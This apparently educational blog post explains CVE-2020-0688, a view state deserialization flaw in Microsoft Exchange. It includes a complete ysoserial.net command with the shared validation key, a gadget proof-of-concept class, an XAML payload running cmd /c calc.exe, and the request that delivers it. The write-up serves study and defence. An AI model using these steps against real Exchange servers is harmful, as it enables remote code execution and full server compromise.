<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="At Digital Self-Defense Lab our mission and values are to provide people throughout the world with a virtual hacker space to create, learn, and explore in a safe, welcoming, and accessible environment.">
    <meta name="author" content="anonymous">
    <title>Digital Self-Defense Lab - Understanding CVE-2020-0688</title>
    <link href="/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet">
    <link href="/assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
    <link href="/assets/css/main.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="/assets/img/favicon.ico">
    <link rel="icon" type="image/png" href="/assets/img/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/assets/img/favicon-96x96.png" sizes="96x96">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/apple-touch-icon.png">
  </head>
  <body id="page-top">
    <div class="container-fluid p-0">
      <section class="main-section p-3 p-lg-5 d-flex align-items-center" id="blog">
        <div class="w-100">
          <article class="lead">
            <header class="mb-4">
              <h2>Understanding CVE-2020-0688</h2>
              <time datetime="2020-04-11T12:00:00+02:00" class="text-primary">Posted on 11 Apr 2020 by anonymous</time>
            </header>
            <div class="message">
              Hello, Guys! In this blog post we will take an in-depth look at CVE-2020-0688 which is a recently published vulnerability in Microsoft Exchange 
              that allows an authenticated attacker to execute arbitrary code on affected Exchange Servers.   
            </div>
            <p>The first section of this blog post is meant as a short introduction to <code class="highlighter-rouge">CVE-2020-0688</code><sup id="fnref:fn-CVE_2020_0688"><a href="#fn:fn-CVE_2020_0688" class="footnote">1</a></sup> to lay the foundation for the great things 
              in the upcoming sections. If you are already familiar with CVE-2020-0688 you can skip the first section and jump straight into the nitty gritty details of how it works.</p>
            <h2 id="introduction">Introduction</h2>
            <p>On February 25th 2020 shortly after Microsoft’s Patch Tuesday, Simon Zuckerbraun from the Zero Day Initiative (ZDI<sup id="fnref:fn-ZDI"><a href="#fn:fn-ZDI" class="footnote">2</a></sup>) published a write-up of CVE-2020-0688 a remote code execution
              vulnerability in Microsoft Exchange that was reported anonymously to ZDI. The anonymous researcher discovered that Microsoft Exchange uses the same cryptographic keys across all installations. This poses a serious risk for the authenticity and integrity of the view state used by the ASP.NET web application included in Microsoft Exchange.</p>
            <p>ASP.NET web applications like the Exchange Control Panel (ECP) make use of the view state mechanism to maintain a page state and persist data in web forms on postbacks. The view state is saved as a hidden form field (<code class="highlighter-rouge">__VIEWSTATE</code>) in the document object model (DOM) delivered by the ASP.NET server to the client (Browser). During the communication between an ASP.NET server and a client the view state is send back and forth between these two parties (NSA not included ;-)). Because HTTP is stateless it wouldn’t be possible for the ASP.NET server to reconstruct the state of web controls after postbacks if there wasn’t the view state.</p>
            <p>Another important aspect about the view state is that it gets deserialized on the server-side. Due to this reason it is essential that the client is unable to tamper with the view state, otherwise this would lead to remote code execution on the ASP.NET server. In order to protect the view state from tampering it’s authenticity and integrity is protected by a Keyed-Hash Message Authentication Code (HMAC) (in some cases the view state is even encrypted). In the case of Microsoft Exchange the same key is used to protect the authenticity and integrity across diffrent installations of Microsoft Exchange, which allows the attacker to forge a valid view state that will get deserialized by the server.</p>
            <h2 id="exploitation-stages">Exploitation Stages</h2>
            <p><img src="/assets/uploads/2020/04/post1/images/1.png" alt="Figure 1: Exploitation Stages" title="Exploitation Stages" /></p>
            <p>In the diagram above you can see an overview of the different stages that the attacker has to go through in order to exploit CVE-2020-0688. The upcoming sections of this blog post are structured based on three stages presented here.</p>
            <h2 id="lab-setup">Lab Setup</h2>
            <p>If you are excited to play around with the public exploits available for CVE-2020-0688 and you are not currently planing to go to jail, it is necessary to setup a vulnerable Microsoft Exchange Server. The following listing shows the lab setup that was used by the author to create the blog post you are currently reading.</p>
            <ol>
              <li>Windows Server 2012 R2</li>
              <li>Microsoft Exchange 2013</li>
              <li><a href="https://docs.microsoft.com/en-us/exchange/exchange-2013-prerequisites-exchange-2013-help">Exchange 2013 Prerequisites</a></li>
              <li><a href="https://github.com/pwntester/ysoserial.net">ysoserial.net: .NET payload generator for deserialization</a></li>
              <li><a href="https://github.com/0xd4d/dnSpy">dnSpy: .NET Debugger</a></li>
              <li><a href="/assets/uploads/2020/04/post1/files/Test.cs">TextFormattingRunProperties POC</a></li>
            </ol>
            <p><cite>DISCLAIMER: Never use the content presented on this website to break any laws! If you don’t play by the rules there won’t be any christmas presents this year.</cite></p>
            <h2 id="collect">Collect</h2>
            <p>Before you can exploit Microsoft Exchange Servers vulnerable to CVE-2020-0688 a few preconditions need to be satisfied:</p>
            <ol>
              <li>Know the <code class="highlighter-rouge">validationKey</code> and <code class="highlighter-rouge">decryptionKey</code> from the <code class="highlighter-rouge">web.config</code> file of your target (those values are public)</li>
              <li>Know the ASP.NET version in use by the target (View state algorithms differ between ASP.NET versions)</li>
              <li>Get valid credentials to access the Exchange Control Panel (ECP) of the target</li>
              <li>Login to the ECP <code class="highlighter-rouge">/ecp/default.aspx</code> and collect the ASP.NET SessionId Cookie value</li>
              <li>While still logged in collect the <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> value from the DOM returned by requesting ECP</li>
            </ol>
            <p>The first point from the list is easly satisfied because the <code class="highlighter-rouge">validationKey</code> and <code class="highlighter-rouge">decryptionKey</code> values are the same for all vulnerable Microsoft Exchange Servers. For the sake of completness below you can find the contents of the <code class="highlighter-rouge">web.config</code> file used in the lab setup described in the previous section. The keys and algorithms defined in the <code class="highlighter-rouge">web.config</code> file play an important role during the runtime of an ASP.NET web application. They are managed by an <code class="highlighter-rouge">MachineKeySection</code> object which according to MSDN is responsible for the following tasks:</p>
            <p><cite>“Defines the configuration settings that control the key generation and algorithms that are used in encryption, decryption, and message authentication code (MAC) operations in Windows Forms authentication, view-state validation, and session-state application isolation.”</cite>.</p>
            <p><img src="/assets/uploads/2020/04/post1/images/2.png" alt="Figure 2: web.config" title="web.config" /></p>
            <p>The <code class="highlighter-rouge">MachineKeySection</code> class provides a method called <code class="highlighter-rouge">GetEncodedData()</code> which we will later use to forge the malicious <code class="highlighter-rouge">__VIEWSTATE</code> as you we will see in the next section.</p>
            <p>Secondly, you need to know the ASP.NET version of the target in order to be able to forge a valid view state which gets accepted by an vulnerable Microsoft Exchange Server. This is important because the view state of ASP.NET version &lt; 4.5 (legacy) and ASP.NET version &gt;= 4.5 (new) are computed differently. How to get the ASP.NET version of a remote system you might ask? My answer is <cite>“enumerate, enumerate, enumerate, …”</cite> until you find it. For my lab machine the ASP.NET version can be seen in the figure below. But please don’t hack me ;-).</p>
            <p><img src="/assets/uploads/2020/04/post1/images/3.png" alt="Figure 3: ASP.NET Version" title="ASP.NET Version" /></p>
            <p>The third condition from the list is the hardest to satisfy, because it requires you to have valid credentials to access one of the maliboxes of the target. Keep in mind that the account used doesn’t need to have any special privileges, therefore chances are quite high that you might get lucky during your pentest journey.</p>
            <p>The fourth condition from our list requires you to capture the ASP.NET SessionId Cookie assigned to your user during login. This can be achived by looking at the HTTP-Headers in the network tab of the debugging tools of your browser.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">// viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
if (viewStateUserKey != null)
{
    int count = Encoding.Unicode.GetByteCount(viewStateUserKey);
    _macKeyBytes = new byte[count + 4];
    Encoding.Unicode.GetBytes(viewStateUserKey, 0, viewStateUserKey.Length, _macKeyBytes, 4);
}
_macKeyBytes[0] = (byte)pageHashCode;
_macKeyBytes[1] = (byte)(pageHashCode &gt;&gt; 8);
_macKeyBytes[2] = (byte)(pageHashCode &gt;&gt; 16);
_macKeyBytes[3] = (byte)(pageHashCode &gt;&gt; 24);

...</code></pre>
            </figure>
            <p>The value from the ASP.NET SessionId Cookie represents the <code class="highlighter-rouge">viewStateUserKey</code> which is used as a CSRF mitigation as can be seen in the source code snippet of the view state plugin (<code class="highlighter-rouge">../ysoserial/Plugins/ViewStatePlugin.cs</code><sup id="fnref:fn-yososerial_ViewStatePlugin"><a href="#fn:fn-yososerial_ViewStatePlugin" class="footnote">3</a></sup>). Note that the <code class="highlighter-rouge">viewStateUserKey</code> and the <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> (<code class="highlighter-rouge">pageHashCode</code>) are added to the <code class="highlighter-rouge">__macKeyBytes</code> array that later on is used as input for the HMAC computation.</p>
            <p>Finally we need to collect the <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> value from the Document Object Model (DOM) of the previously requested Exchange Control Panel (ECP). Think of the <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> as a unique hash representation of the web path requested. This hash value is calculated with the help of the <code class="highlighter-rouge">GetNonRandomizedHashCode</code> function which can be found in the <code class="highlighter-rouge">System.Web.Util.StringUtil</code> class. The inputs for the function are the IIS path (e.g. <code class="highlighter-rouge">/</code>) and the path of the requested page (e.g. <code class="highlighter-rouge">/ecp/default.aspx</code>). The <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> value combined with the <code class="highlighter-rouge">viewStateUserKey</code> described in the paragraph before are part of the HMAC computation performed while creating a view state.</p>
            <p>With the help of the cryptographic parameters <code class="highlighter-rouge">viewStateUserKey</code> and the <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> the following properites are achived by the ASP.NET web application:</p>
            <ul>
              <li>The <code class="highlighter-rouge">viewStateUserKey</code> is unique for each user session and is included in the computation of the view state HMAC. Because the <code class="highlighter-rouge">viewStateUserKey</code> is kept secret the attacker is not able to know its value  beforehand. Therefore it is impossible for the attacker to create a web form that will trick a victim into requesting a certain action from the backend because that would require the attacker to be able to compute the view state. This provides a sufficient protection against CSRF attacks.</li>
              <li>The <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> (part of HMAC computation) restricts the view state to the web application it originated from. Therefore it’s not possible to reply the view state of an established session to other parts of the ASP.NET web application.</li>
            </ul>
            <h2 id="forge">Forge</h2>
            <p>After collecting all necessary cryptographic parameters it’s time to forge a malicious <code class="highlighter-rouge">__VIEWSTATE</code> by using a tool called <code class="highlighter-rouge">ysoserial.net</code>. According to the description found on the projects github page, <code class="highlighter-rouge">ysoserial.net</code><sup id="fnref:fn-github_yoserialnet"><a href="#fn:fn-github_yoserialnet" class="footnote">4</a></sup> is <cite>“A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization”</cite>.</p>
            <p>The cool part about <code class="highlighter-rouge">ysoserial.net</code> is that it contains a plugin called <code class="highlighter-rouge">ViewStatePlugin.cs</code> that is able to generate view states for ASP.NET version &lt; 4.5 (legacy) and ASP.NET version &gt;= 4.5 (new). In the following you can see how we use the tool <code class="highlighter-rouge">ysoserial.net</code> in combination with the previously collected cryptographic parameters to forge a malicious <code class="highlighter-rouge">__VIEWSTATE</code>.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">ysoserial.exe --plugin="ViewState" --islegacy
 
              --validationalg="SHA1" 
              --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"
               
              --viewstateuserkey="05ae4b41-51e1-4c3a-9241-6b87b169d663"
              --generator="B97B4E27"

              --gadget="TextFormattingRunProperties"
              --command="calc.exe" </code></pre>
            </figure>
            <p>In the first argument we specify the view state plugin which tells <code class="highlighter-rouge">ysoserial.net</code> that we want to forge a <code class="highlighter-rouge">__VIEWSTATE</code>. The second argument tells <code class="highlighter-rouge">ysoserial.net</code> the type of <code class="highlighter-rouge">__VIEWSTATE</code> we want to forge. We want to generate a legacy <code class="highlighter-rouge">__VIEWSTATE</code> because the ASP.NET version in our lab environment is 4.0 and therefore the view state needs to be in legacy format.</p>
            <p>The following two arguments represent the fixed cryptographic parameters which are the root cause of CVE-2020-0688. Note that the hash algorithm used to compute the HMAC of the <code class="highlighter-rouge">__VIEWSTATE</code> is <code class="highlighter-rouge">SHA1</code>. This means that the integrity and authenticity of the <code class="highlighter-rouge">__VIEWSTATE</code> is protected by a Keyed-Hash Message Authentication Code (HMAC) base on <code class="highlighter-rouge">SHA1</code>. The key used to ensure the authenticity is the <code class="highlighter-rouge">ValidationKey</code>. As mentioned earlier the <code class="highlighter-rouge">ValidationKey</code> is the same for all vulnerable Microsoft Exchange Servers, which is the reason why this vulnerablity exists.</p>
            <p>The next two arguments are the <code class="highlighter-rouge">__VIEWSTATEGENERATOR</code> and the <code class="highlighter-rouge">ViewStateUserKey</code>. Both values have been collected after logging into the ASP.NET web application (e.g. ECP) part of the vulnerable  Exchange Server. If you are not familiar with the purpouse of the two arguments I recommend you to go back to the previous section and refresh your memory. The one importat thing to remember for now is that the two arguments are part of the HMAC computation.</p>
            <p>Now it’s time to look into the view state plugin included in <code class="highlighter-rouge">ysoserial.net</code>, so we are able to see exactly how a malicious <code class="highlighter-rouge">__VIEWSTATE</code> is generated.</p>
            <p>The plugin is located under <code class="highlighter-rouge">/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs</code>.</p>
            <p>If you browse through <code class="highlighter-rouge">ViewStatePlugin.cs</code> you will notice that the function responsible for generating the malicious <code class="highlighter-rouge">__VIEWSTATE</code> is the one called <code class="highlighter-rouge">generateViewStateLegacy_2_to_4()</code>. In the code listing below you can see a number of functions that are called from <code class="highlighter-rouge">generateViewStateLegacy_2_to_4()</code> to generate the malicious <code class="highlighter-rouge">__VIEWSTATE</code>.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">generateViewStateLegacy_2_to_4()
|
+-&gt; MachineKeySection.GetEncodedData()
    |
    +-&gt; MachineKeySection.HashData()
	    |
	    +-&gt; MachineKeySection.GetHMACSHA1Hash()
		    |
		    +-&gt; UnsafeNativeMethods.GetHMACSHA1Hash()	</code></pre>
            </figure>
            <p>The first thing you see when looking at some of the functions called by <code class="highlighter-rouge">generateViewStateLegacy_2_to_4()</code> is that they clearly have something to do with the HMAC computation. Another important detail to notice is that the functions are from the <code class="highlighter-rouge">MachineKeySection</code><sup id="fnref:fn-microsoft_MachineKeySection"><a href="#fn:fn-microsoft_MachineKeySection" class="footnote">5</a></sup> class which according to MSDN is responsible for handling view-state validation, <cite>“Defines the configuration settings that control the key generation and algorithms that are used in encryption, decryption, and message authentication code (MAC) operations in Windows Forms authentication, view-state validation, and session-state application isolation.”</cite>.</p>
            <p>The malicious <code class="highlighter-rouge">__VIEWSTATE</code> is nothing more than a serialized and base64 encoded <code class="highlighter-rouge">Gadget</code> (we will come back to this later) combined with an HMAC computed from the <code class="highlighter-rouge">Gadget</code> itself and the cryptographic parameters collected in the first stage of our attack.</p>
            <p>The diagram below should help you to understand how the HMAC is generated by <code class="highlighter-rouge">generateViewStateLegacy_2_to_4()</code> based on the <code class="highlighter-rouge">Gadget</code> and the cryptographic parameters provided to the function.</p>
            <p><img src="/assets/uploads/2020/04/post1/images/4.png" alt="Figure 4: SHA1 HMAC" title="SHA1 HMAC" /></p>
            <p>Finally the HMAC above is appended to the serialized and base64 encoded <code class="highlighter-rouge">Gadget</code> which represents the malicious <code class="highlighter-rouge">__VIEWSTATE</code> as shown in the following diagram.</p>
            <p><img src="/assets/uploads/2020/04/post1/images/5.png" alt="Figure 5: Malicious __VIEWSTATE" title="Malicious __VIEWSTATE" /></p>
            <p>At this point you might have noticed that there are still two arguments left from the <code class="highlighter-rouge">ysoserial.net</code> commandline that need some explanation. Those two arguments will be covered in greater detail the upcoming section.</p>
            <h2 id="smash">Smash</h2>
            <p>In the previous section we introduced the vast majority of arguments required by the tool <code class="highlighter-rouge">ysoserial.net</code> to forge a malicious <code class="highlighter-rouge">__VIEWSTATE</code> with the exception of the two arguments <code class="highlighter-rouge">gadget</code> and <code class="highlighter-rouge">command</code>. These two arguments are responsible for providing a means of code execution as we will see in the following paragraphs.</p>
            <p>Before we continue let’s remember that our final goal is to execute code on the vulnerable Microsoft Exchange Server, which requires us to send the server a malicious <code class="highlighter-rouge">__VIEWSTATE</code> that, when deserialized on the server-side leads to code execution.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">ysoserial.exe ...

              --gadget="TextFormattingRunProperties"
              --command="calc.exe" </code></pre>
            </figure>
            <p>The last argument from the above commandline which is named <code class="highlighter-rouge">command</code>, is responsible for what gets executed when our malicious <code class="highlighter-rouge">__VIEWSTATE</code> is deserialized by the server-side. For demonstration purpouses <code class="highlighter-rouge">calc.exe</code> is used as our final payload but in general the value is only limited by the imagination of the attacker.</p>
            <p>But what about this mysterious argument named <code class="highlighter-rouge">gadget</code> which has <code class="highlighter-rouge">TextFormattingRunProperties</code> as its value? As you might have guessed by now the actual magic lies in the class called <code class="highlighter-rouge">TextFormattingRunProperties</code>.</p>
            <p>Classes like <code class="highlighter-rouge">TextFormattingRunProperties</code> are regular building blocks of the .NET-Framework with the exception that they provide an indirect (often not intended) way of enabling code execution during deserialization.</p>
            <p>When deserializing an serialized object of the type <code class="highlighter-rouge">TextFormattingRunProperties</code> a chain of methods is called on its properties which finally leads to code execution. In technical terms this is often referred to as <code class="highlighter-rouge">Gadget chain</code>. Now let’s take a look at how this gadget can help us in achieving code execution on our Microsoft Exchange Server.</p>
            <p>To demonstrate to you what happens when an object of type <code class="highlighter-rouge">TextFormattingRunProperties</code> gets deserialized we will take a look at a proof-of-concept code borrowed from the finders of the gadget Alvaro Muñoz and Oleksandr Mirosh<sup id="fnref:fn-New_Gadget"><a href="#fn:fn-New_Gadget" class="footnote">6</a></sup>.</p>
            <p>The class below implements the interface <code class="highlighter-rouge">ISerializable</code> which tells us that objects of this type will use a custom way of serialization. When serialzing an object the <code class="highlighter-rouge">GetObjectData</code> method is called implcitly. Inside this method we specify the property <code class="highlighter-rouge">ForegroundBrush</code> as part of the <code class="highlighter-rouge">SerializationInfo</code> object. According to MSDN the <code class="highlighter-rouge">SerializationInfo</code> class is responsible for the storage of all the data that is needed to serialize or deserialize an object. Also note that the type of <code class="highlighter-rouge">ForegroundBrush</code> is defined as <code class="highlighter-rouge">TextFormattingRunProperties</code> and that it uses the variable <code class="highlighter-rouge">_xaml</code> as its value.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">[Serializable]
public class TextFormattingRunPropertiesMarshal : ISerializable
{
	string _xaml;
	public void GetObjectData(SerializationInfo info, StreamingContext context)
	{
		Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, 
								Microsoft.PowerShell.Editor, 
								Version=3.0.0.0, 
								Culture=neutral, 
								PublicKeyToken=31bf3856ad364e35");
		info.SetType(t);
		info.AddValue("ForegroundBrush", _xaml);
	}
	public TextFormattingRunPropertiesMarshal(string xaml)
	{
		_xaml = xaml;
	}
}	</code></pre>
            </figure>
            <p>The complete source code of this example can be found <a href="/assets/uploads/2020/04/post1/files/Test.cs">here</a>.</p>
            <p>Before we are able to execute arbitrary commands with the help of the class presented above we first need to define the variable <code class="highlighter-rouge">payload</code> of type <code class="highlighter-rouge">string</code> which will contain the following XAML. If this doesn’t make any sense to you right now don’t worry we will shortly provide you with an detailed explanation of whats going on here.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:System="clr-namespace:System;assembly=mscorlib"
xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
	&lt;ObjectDataProvider x:Key="RunCalc" ObjectType = "{ x:Type Diag:Process }" MethodName = "Start"&gt;
	&lt;ObjectDataProvider.MethodParameters&gt;
		&lt;System:String&gt;cmd&lt;/System:String&gt;
		&lt;System:String&gt;/c calc.exe &lt;/System:String&gt;
	&lt;/ObjectDataProvider.MethodParameters&gt;
	&lt;/ObjectDataProvider&gt;
&lt;/ResourceDictionary&gt;</code></pre>
            </figure>
            <p>What follows next is that we create an object of type <code class="highlighter-rouge">TextFormattingRunPropertiesMarshal</code> and provide its constructor the previously defined <code class="highlighter-rouge">payload</code> variable which contains the XAML specified above. In the subsequent lines we see how the object is first serialized and then deserialized immediately. For the purpouse of serialization/deserialization we use the class <code class="highlighter-rouge">LosFormatter</code><sup id="fnref:fn-microsoft_LosFormatter"><a href="#fn:fn-microsoft_LosFormatter" class="footnote">7</a></sup>. This class is used by ASP.NET web applications to serialize/deserialize the view state.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">Object obj = new TextFormattingRunPropertiesMarshal(payload);
LosFormatter fmt = new LosFormatter();
MemoryStream ms = new MemoryStream();
fmt.Serialize(ms, obj);
ms.Position = 0;
fmt.Deserialize(ms);</code></pre>
            </figure>
            <p>When you compile and execute the binary from this c-sharp proof-of-conecept code (POC) a calculator will somehow magically appear as can be seen in the following figure.</p>
            <p><img src="/assets/uploads/2020/04/post1/images/6.png" alt="Figure 6: TextFormattingRunProperties Gadget" title="TextFormattingRunProperties Gadget" /></p>
            <p>In order to understand what happened until this point we need to take a step back and look at some of the properties of the gadget <code class="highlighter-rouge">TextFormattingRunProperties</code>. The first thing to notice when looking at the gadget class is that it contains a <code class="highlighter-rouge">Serializable</code> attribute and that the class implements an interface of type <code class="highlighter-rouge">ISerializable</code>. This tells us that the gadget class will implement a custom form of serialization/deserialization.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">[System.Serializable]
public sealed class TextFormattingRunProperties : 
System.Windows.Media.TextFormatting.TextRunProperties, 
System.Runtime.Serialization.IObjectReference, 
System.Runtime.Serialization.ISerializable</code></pre>
            </figure>
            <p>The next thing we will have a look at are methods which belong to the gadget class and have something to do with serialization. As you can see in the figure below the gadget class implements its own <code class="highlighter-rouge">GetObjectData()</code> method as demanded by the <code class="highlighter-rouge">ISerializable</code> interface. The interesting part from the method description is the mentioning of the class <code class="highlighter-rouge">XamlWriter</code>. This is a clear sign that objects created from our gadget class a serialized and deserialized with the help of <code class="highlighter-rouge">XamlWriter</code> and <code class="highlighter-rouge">XamlReader</code>.</p>
            <p><img src="/assets/uploads/2020/04/post1/images/7.png" alt="Figure 7: TextFormattingRunProperties.GetObjectData()" title="TextFormattingRunProperties.GetObjectData()" /></p>
            <p>Remember what happens when a custom .NET object gets deserialized? No!? Let me help you. The answer is that a special constructor is called which in the case of our gadget class <code class="highlighter-rouge">TextFormattingRunProperties</code> looks as follows:</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">TextFormattingRunProperties.ctor(SerializationInfo, StreamingContext)</code></pre>
            </figure>
            <p>Inside this special constructor used for deserialization purposes a method named <code class="highlighter-rouge">GetObjectFromSerializationInfo()</code> is called on each property of our gadget class that needs to be deserialized. The serialized properties are retrieved from the <code class="highlighter-rouge">SerializationInfo</code> object passed to the method.</p>
            <p><img src="/assets/uploads/2020/04/post1/images/8.png" alt="Figure 8: TextFormattingRunProperties.GetObjectFromSerializationInfo()" title="TextFormattingRunProperties.GetObjectFromSerializationInfo()" /></p>
            <p>In the figure above you can see what happens inside the method <code class="highlighter-rouge">GetObjectFromSerializationInfo()</code>. Note that the method <code class="highlighter-rouge">XamlReader.Parse()</code> is called on the property <code class="highlighter-rouge">ForegroundBrush</code> which contains the XAML we have seen before.</p>
            <p>What happend so far is that we attempted to deserialize the gadget of type <code class="highlighter-rouge">TextFormattingRunProperties</code> with the help of <code class="highlighter-rouge">LosFormatter</code>. During deserialization each object of a specific type that is part of the object graph gets deserialized in its intended way. This involves calling the specialized constructor introduced earlier in this section. The result of calling the specialized constructor is that <code class="highlighter-rouge">XamlReader.Parse()</code> will be called on each property of class such as <code class="highlighter-rouge">ForegroundBrush</code>. The magic begins when we pass the contents of <code class="highlighter-rouge">ForegroundBrush</code> (XAML) into the <code class="highlighter-rouge">Parse()</code> method.</p>
            <p>At this point <code class="highlighter-rouge">XamlReader.Parse()</code> will take care of the XAML content present in the property <code class="highlighter-rouge">ForegroundBrush</code>. After parsing the XAML definitions an object of type <code class="highlighter-rouge">ObjectDataProvider</code> will be instantiated. The class <code class="highlighter-rouge">ObjectDataProvider</code> is responsible for creating an object that can be used as a binding source for Windows Presentation Foundation (WPF) application GUI elements.</p>
            <p>A binding source can be described as the association between an GUI element (e.g. WPF Window) and a method which is responsible for creating or fetching data used by that GUI element. This association is described in XAML. The best part about <code class="highlighter-rouge">ObjectDataProviders</code> from an attackers point of view is that they provide a way to execute code on a target that can be tricked into calling <code class="highlighter-rouge">XamlReader.Parse()</code> on a malicious <code class="highlighter-rouge">ObjectDataProviders</code> XAML definition.</p>
            <p>Guess what!? This is exactly what is happening in our example! As we will explorer in the next section.</p>
            <h2 id="wrapping-it-all-up">Wrapping it all up</h2>
            <p>We are first defining a malicious <code class="highlighter-rouge">ObjectDataProvider</code> (in XAML) that gets assigned to our <code class="highlighter-rouge">payload</code> variable which in turn becomes part of the <code class="highlighter-rouge">ForegroundBrush</code> property of our gadget class <code class="highlighter-rouge">TextFormattingRunProperties</code>.</p>
            <p>In the second step we serialize our gadget class with the help of the formatter <code class="highlighter-rouge">LosFormatter</code>. Based on the serialized gadget and the cryptographic parameters introduced in one of the previous sections an HMAC is computed which is then appended to the serialized gadget. The resulting structure is called view state.</p>
            <p>In the next step the malicious <code class="highlighter-rouge">__VIEWSTATE</code> is send back the the vulnerable ASP.NET web application part of Microsoft Exchange. The HTTP GET-Request is shown below.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">/ecp/default.aspx?__VIEWSTATEGENERATOR=&lt;value&gt;&amp;__VIEWSTATE=&lt;value&gt;</code></pre>
            </figure>
            <p>After receiving the view state the ASP.NET web application uses the <code class="highlighter-rouge">LosFormatter.Deserialize()</code> method to deserialize its contents.</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">public object Deserialize(string input) {

#if NO_BASE64
        char[] data = input.ToCharArray();
#else
        byte[] dataBytes = Convert.FromBase64String(input);

        int dataLength = -1;
        if (EnableViewStateMac) {

            try {
                dataBytes = MachineKeySection.GetDecodedData(dataBytes, _macKey, 0, dataBytes.Length, ref dataLength);
            }
            catch (Exception e) {
                PerfCounters.IncrementCounter(AppPerfCounter.VIEWSTATE_MAC_FAIL);
                ViewStateException.ThrowMacValidationError(e, input);
            }
        }
...</code></pre>
            </figure>
            <p>The <code class="highlighter-rouge">LosFormatter</code> uses the specialized constructor of the serialized <code class="highlighter-rouge">TextFormattingRunProperties</code> object to deserialize its properties. Additionally the <code class="highlighter-rouge">ForegroundBrush</code> which holds the malicious <code class="highlighter-rouge">ObjectDataProvider</code> (in XAML) gets passed into <code class="highlighter-rouge">XamlReader.Parse()</code> as part of a a function call to <code class="highlighter-rouge">GetObjectFromSerializationInfo()</code> (Boooom!!!).</p>
            <p><img src="/assets/uploads/2020/04/post1/images/9.png" alt="Figure 9: ObjectDataProvider.InvokeMethodOnInstance()" title="ObjectDataProvider.InvokeMethodOnInstance()" /></p>
            <p>Finally the <code class="highlighter-rouge">ObjectDataProvider</code> object gets instantiated, and the method <code class="highlighter-rouge">System.Diagnostics.Process.start()</code> from <code class="highlighter-rouge">System.dll</code> is invoked with the help of another method called <code class="highlighter-rouge">ObjectDataProvider.InvokeMethodOnInstance()</code> as can be seen in the figure above. The <code class="highlighter-rouge">start()</code> method is used to execute <code class="highlighter-rouge">cmd.exe</code> with the commandline <code class="highlighter-rouge">/c calc.exe</code>. This results in the creation of a <code class="highlighter-rouge">calc.exe</code> process or a full compromise of the targeted Microsoft Exchange Server.</p>
            <hr />
            <p>Want to see something else added? <a href="https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new">Open an issue.</a></p>
            <div class="footnotes">
              <ol>
                <li id="fn:fn-CVE_2020_0688">
                  <p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688">Microsoft: CVE-2020-0688</a> <a href="#fnref:fn-CVE_2020_0688" class="reversefootnote">&#8617;</a></p>
                </li>
                <li id="fn:fn-ZDI">
                  <p><a href="https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">Zero Day Initiative: CVE-2020-0688</a> <a href="#fnref:fn-ZDI" class="reversefootnote">&#8617;</a></p>
                </li>
                <li id="fn:fn-yososerial_ViewStatePlugin">
                  <p><a href="https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs">Yososerial.net: ViewStatePlugin.cs</a> <a href="#fnref:fn-yososerial_ViewStatePlugin" class="reversefootnote">&#8617;</a></p>
                </li>
                <li id="fn:fn-github_yoserialnet">
                  <p><a href="https://github.com/pwntester/ysoserial.net">Github: yoserial.net</a> <a href="#fnref:fn-github_yoserialnet" class="reversefootnote">&#8617;</a></p>
                </li>
                <li id="fn:fn-microsoft_MachineKeySection">
                  <p><a href="https://github.com/microsoft/referencesource/blob/master/System.Web/Configuration/MachineKeySection.cs">Microsoft: MachineKeySection.cs</a> <a href="#fnref:fn-microsoft_MachineKeySection" class="reversefootnote">&#8617;</a></p>
                </li>
                <li id="fn:fn-New_Gadget">
                  <p><a href="https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282">Micro Focus: New .NET deserialization gadget for compact payload</a> <a href="#fnref:fn-New_Gadget" class="reversefootnote">&#8617;</a></p>
                </li>
                <li id="fn:fn-microsoft_LosFormatter">
                  <p><a href="https://github.com/microsoft/referencesource/blob/master/System.Web/UI/LOSFormatter.cs">Microsoft: LosFormatter.cs</a> <a href="#fnref:fn-microsoft_LosFormatter" class="reversefootnote">&#8617;</a></p>
                </li>
              </ol>
            </div>
            <footer>
              <aside class="mt-5">
